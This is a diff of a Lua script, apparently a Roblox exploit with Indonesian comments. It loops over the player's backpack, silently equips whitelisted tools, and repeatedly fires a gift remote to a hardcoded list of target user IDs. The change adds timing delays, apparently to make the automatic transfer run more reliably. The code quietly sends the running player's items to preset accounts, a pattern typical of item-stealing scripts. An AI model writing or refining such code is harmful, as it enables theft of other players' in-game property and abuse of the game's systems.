@@ -764,26 +764,25 @@ end)
 
 task.spawn(function()
     while true do
+        task.wait(0.05)
+
         for _,tool in ipairs(backpack:GetChildren()) do
             if tool:IsA("Tool")
-            and tool.Parent == backpack
-            and not isWeightTool(tool) then
+            and not isWeightTool(tool)
+            and isWhitelisted(tool)
+            and tool.Parent == backpack then
 
-                -- 🔥 equip dulu
                 silentEquip(tool)
+                task.wait(0.03)
 
-                -- 🔥 cek whitelist + mutation
-                if isWhitelisted(tool) then
-                    for _,id in ipairs(targetUserIds) do
-                        giftRemote:FireServer(id)
-                    end
+                for _,id in ipairs(targetUserIds) do
+                    giftRemote:FireServer(id)
+                    task.wait(0.05)
                 end
 
-                -- 🔥 langsung balikin (no delay lama)
-                tool.Parent = backpack
+                unequipAll()
+                task.wait(0.03)
             end
         end
-
-        task.wait(0.005) -- yield tipis biar gak freeze
     end
 end)
